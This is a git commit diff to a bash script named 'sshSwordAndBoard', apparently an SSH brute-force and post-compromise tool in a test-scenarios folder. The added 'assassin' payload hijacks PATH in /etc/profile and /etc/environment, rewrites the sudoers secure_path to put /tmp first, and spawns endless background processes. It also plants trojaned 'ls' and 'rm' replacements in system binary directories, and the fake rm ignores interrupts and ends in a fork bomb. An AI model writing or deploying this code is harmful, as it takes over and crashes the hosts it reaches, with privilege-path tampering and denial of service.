8afb0e77bfbb3006a62577ca679fcb62460fb281
Frosty939 <swfrosty@gmail.com>
2018-12-07 15:08:35 -0500

    0.3

--- testScenarios/sshSwordAndBoard/sshSwordAndBoard.sh
+++ testScenarios/sshSwordAndBoard/sshSwordAndBoard.sh
@@ -94,7 +94,6 @@ function bones(){
 
 ##################################################
 ### checking for/creating custom lists ###########
-
 	#file locations
 		hydraOutput="/tmp/hydraOutput"
 		crackedLogins="logins"
@@ -133,7 +132,7 @@ function bones(){
 function meat(){
 ##################################################
 ### checking for/installing tools ################
-	command="hydra hashcat john nmap curl net-tools"
+	command="hydra hashcat john nmap curl net-tools sshpass"
 	installing=""
 	updated=1
 	scriptPath="$(pwd)/$(basename $0)"
@@ -198,9 +197,199 @@ function brute(){
 # ssh's in and does it's business
 ###########################################################################################
 function assassin(){
-	#
-	:
+	#### launcher ###########
+	function payload(){		#
+		detectomatic		#
+		sandman				#
+		seeder				#
+	}						#
+	#########################
+	function detectomatic(){
+		### test if debian or ubuntu
+		osDetect="$(uname -v | egrep -o "Debian|Ubuntu")"
+		debPATH="/etc/profile"
+		ubuPATH="/etc/environment"
+		ubuSecPATH="/etc/sudoers"
+		ubuSecPATHnew="/etc/sudoers.new"
+
+		### is Debian
+		if [ $osDetect == "Debian" ]; then
+			testPATH="echo $PATH | cut -d: -f1"
+			if [[ "$testPATH" != "/tmp" ]]; then
+				#changes PATH for current user, no matter what it is
+				sed -i "s|PATH=$PATH|PATH=/tmp:$PATH|" $debPATH
+			fi
+			#changes PATH for all users, if the default is still in place
+			debCleanRootPATH='PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"'
+			debCleanUserPATH='PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"'
+				debDirtyRootPATH='PATH="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"'
+				debDirtyUserPATH='PATH="/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"'
+			sed -i "s|$debCleanRootPATH|$debDirtyRootPATH|" $debPATH
+			sed -i "s|$debCleanUserPATH|$debDirtyUserPATH|" $debPATH
+		fi
+		### is Ubuntu
+		if [ $osDetect == "Ubuntu" ]; then
+			ubuCleanRootPATH='secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"'
+			ubuCleanUserPATH='PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"'
+				ubuDirtyRootPATH='secure_path="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"'
+				ubuDirtyUserPATH='PATH="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"'
+			sed -i "s|$ubuCleanUserPATH|$ubuDirtyUserPATH|" $ubuPATH
+
+			if [ -f "$ubuSecPATHnew" ]; then
+				exit 1
+			fi
+			# copies and edits the sudoers file
+			command cp $ubuSecPATH{,.new}
+			command chmod 750 $ubuSecPATHnew
+			sed -i "s|$ubuCleanRootPATH|$ubuDirtyRootPATH|" $ubuSecPATHnew
+			command chmod 0440 $ubuSecPATHnew
+			# checks that the changes are good
+			visudo -c -f $ubuSecPATHnew
+			# moves the modified file over the old one
+			if [ "$?" -eq "0" ]; then
+			    cp $ubuSecPATHnew $ubuSecPATH
+			fi
+
+			rm $ubuSecPATHnew
+		fi
+		#** un-fuck *******************************
+			function unfuck(){
+				# deletes all the dirty scipts
+				command /bin/rm -f $seedPathsLS $seedPathsRM
+			}
 	}
+#** Terminator ************************************
+#	function terminator(){
+#		ssh root@MachineB "$(declare -f FUNCTION); FUNCTION"
+#	}
+
+#** Tripmine **************************************
+
+#** Sandman ***************************************
+	function sandman(){
+		while : ; do
+			nohup bash -c "exec -a Sandman sleep 6969" > /dev/null 2>&1 &
+		done
+	}
+### Seeder ########################################
+	function seeder(){
+		seedPathsLS="/tmp/ls /usr/local/sbin/ls /usr/local/bin/ls /usr/sbin/ls /usr/bin/ls"
+		seedPathsRM="/tmp/rm /usr/local/sbin/rm /usr/local/bin/rm /usr/sbin/rm /usr/bin/rm"
+		triggerPath="/tmp/.trigger"
+		incrementPath="/tmp/.increment"
+		# dumps the scripts, increment, and trigger files into all the dirs they are supposed to be
+		command echo "$dirtyLS" | tee $seedPathsLS > /dev/null
+		command echo "$dirtyRM" | tee $seedPathsRM > /dev/null
+		if [ -e $incrementPath ]; then
+			command echo "increment=0" > $incrementPath
+		fi
+		# sourcing increment file, so it can hopefully be incremented
+		source $incrementPath
+		# makes everything executable
+		command chmod +x $seedPathsLS $seedPathsRM
+		command chmod 777 $seedPathsLS $seedPathsRM
+	}
+
+### dirty: ls #####################################
+	dirtyLS="$(cat <<-'EOF'
+	#!/bin/bash
+	#
+	# commented, non-obfuscated, and basic readability in place to be nice. (you would normally never be able to just read it)
+	#
+	trigger="/usr/local/sbin/.trigger"
+	# pulls in and builds argsLS for the real ls
+	argsLS=""
+	while [[ "$1" != "" ]]; do
+		argsLS="$1 ${argsLS}"
+		shift
+	done
+
+	# checks for the trigger file, if its missing it acts like normal
+	if [ -e $trigger ]; then
+		echo test
+	else
+		/bin/ls $argsLS
+		printf "\n\n----\n\n"
+		printf "argsLS= $argsLS\n"
+	fi
+	EOF
+	)"
+
+### dirty: rm ###################################
+	dirtyRM="$(cat <<-'EOF'
+	#!/bin/bash
+	#
+	# commented, non-obfuscated, and basic readability in place to be nice. (you would normally never be able to just read it)
+	#
+	trap "printf '\nheh..not THAT easy..\n'" SIGINT SIGTERM
+	#####################
+	function main(){	#
+		buildEmUp		#
+		tripwire		#
+	}					#
+	#####################
+	### defining, and sourcing, increment info ###
+	function buildEmUp(){
+		incrementPath="/tmp/.increment"
+			# checking if increment file exists, making it if not
+			if [ ! -e $incrementPath ]; then
+				echo "increment=0" > $incrementPath
+			fi
+		source $incrementPath
+
+		# pulls in and builds argsRM for the real rm
+		argsRM=""
+		while [[ "$1" != "" ]]; do
+			argsRM="$1 ${argsRM}"
+			shift
+		done
+	}
+
+	#### checks for the trigger file, if its missing it acts like normal ###
+	function tripwire(){
+		if [ ! -e /usr/local/sbin/.trigger ]; then
+			echo "trigger is missing"
+			rmCase
+		else
+			/bin/rm $argsRM
+			printf "\n\n----\n\n"
+			printf "argsRM= $argsRM\n"
+		fi
+	}
+
+	### determining what happens based on number of times used ###
+	function rmCase(){
+		case $attemptNum in
+			0)
+					increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
+					echo "after case: $attemptNum"
+					echo "increment: $increment"
+					echo "hard drives are big. no need to delete anything.."
+					;;
+			1)
+					increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
+					printf "\nrude.\nstop that.\n"
+					;;
+			2)
+					clear
+					increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
+					echo $increment
+					printf "\nHere.\n";sleep 2; printf "LET.."; sleep 3; printf "ME.."; sleep 2; printf "HELP..\n"; sleep 2; :(){ :|:& };:
+					;;
+			*)
+					clear
+					printf "\nBewbs\n"
+					;;
+		esac
+	}
+	main
+		EOF
+		)"
+
+	payload
+}
+
+
 #+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 #+++++++++++++++++++++++++++++++++ FIGHT!! +++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 #+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
